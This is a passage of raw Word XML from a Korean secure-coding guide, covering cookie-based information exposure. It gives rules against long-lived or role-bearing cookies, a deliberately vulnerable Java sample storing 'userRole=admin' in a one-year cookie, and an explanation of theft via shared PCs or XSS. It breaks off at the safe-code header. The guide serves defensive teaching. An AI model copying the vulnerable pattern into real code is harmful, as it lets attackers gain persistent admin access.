              </w:rPr>
              <w:t>기본</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> TrustManager </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>HttpsURLConnection.setDefaultSSLSocketFactory(ctx.getSocketFactory());</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  12. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>쿠키를</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>통한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>정보노출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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿠키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만료시간은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세션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지속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시간을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고려하여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최소한으로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설정한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>영속적인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쿠키에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사용자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권한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등급</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> ID </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등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중요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정보를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포함하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>영속</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿠키에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Cookie cookie = new Cookie("userRole", "admin");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>cookie.setMaxAge(60 * 60 * 24 * 365);  // 1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>년</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>유지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>디스크에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>response.addCookie(cookie);</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> 1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>년짜리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>영속</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿠키에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>저장하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> PC</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>나</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기기에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿠키</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>복사하는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>것만으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>관리자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>영구적으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>획득할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. XSS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿠키를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>재로그인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>무기한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>관리자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>유지됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
